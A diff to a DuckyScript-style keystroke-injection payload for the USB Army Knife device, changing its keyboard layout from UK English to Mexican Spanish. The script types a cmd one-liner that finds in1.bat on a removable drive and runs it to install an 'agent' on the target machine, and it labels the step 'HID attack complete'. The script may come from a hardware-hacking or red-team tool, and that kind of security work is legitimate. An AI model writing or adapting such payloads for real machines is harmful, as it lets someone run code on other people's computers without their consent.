@@ -1,7 +1,8 @@
 REM To run this, you first need to create a disk image which contains the agent
 REM Follow tools/README.md for instructions
 REM Make sure the disk image is named agent.img you put it on the SD card
-LOG UK agent script
+REM This version uses Mexican Spanish keyboard layout (win_es-MX)
+LOG Mexican Spanish agent script
 
 DEFINE #FILE /agentInstalled
 
@@ -25,21 +26,24 @@ IF (FILE_EXISTS() == FALSE) THEN
   REM We are trying to run the following command
   REM cmd /c @echo off & for %d in (D E F G H) do if exist %d:\in1.bat %d:\in1.bat #_VID_ #_PID_
   REM By default the USB Army Knife uses a US keyboard layout and the keycodes for \ are different
-  REM To get this working on a UK layout we have two choices either:
-  REM * Compile in the win_en-GB locale (which we do by default) and then use the 'KEYBOARD_LAYOUT win_en-GB' command
-  REM * Send manual HID codes with RAW_HID SHIFT 0x64
+  REM To get this working with Spanish layouts we have two choices either:
+  REM * Use the KEYBOARD_LAYOUT command with win_es-MX (Mexican Spanish - compiled by default)
+  REM * Use the KEYBOARD_LAYOUT command with win_es (Spanish Spain - compiled by default)
+  REM * Send manual HID codes with RAW_HID
 
-  REM For this example we'll use RAW_HID
+  REM For this example we'll use the Mexican Spanish layout
+  KEYBOARD_LAYOUT win_es-MX
 
   REM To run we tell the agent the VID and PID of this device. That way it knows exactly what device to talk to
   REM The interpreter injects some 'constants' like #_VID_ and #_PID_.
   REM This is to keep compatibility with DuckyScript3 but allows us to have dynamic variables we can use in our attack
 
-  STRING cmd /c @echo off & for %d in (D E F G H) do if exist %d:
-  RAW_HID 0x64
-  STRING in1.bat %d:
-  RAW_HID 0x64
-  STRING in1.bat #_VID_ #_PID_
+  REM Using Mexican Spanish layout - backslash should work correctly now
+  STRING cmd /c @echo off & for %d in (D E F G H) do if exist %d:\in1.bat %d:\in1.bat #_VID_ #_PID_
+  
+  REM Alternative: Use Spanish (Spain) layout instead
+  REM KEYBOARD_LAYOUT win_es
+  REM STRING cmd /c @echo off & for %d in (D E F G H) do if exist %d:\in1.bat %d:\in1.bat #_VID_ #_PID_
   ENTER
 
   LOG HID attack complete
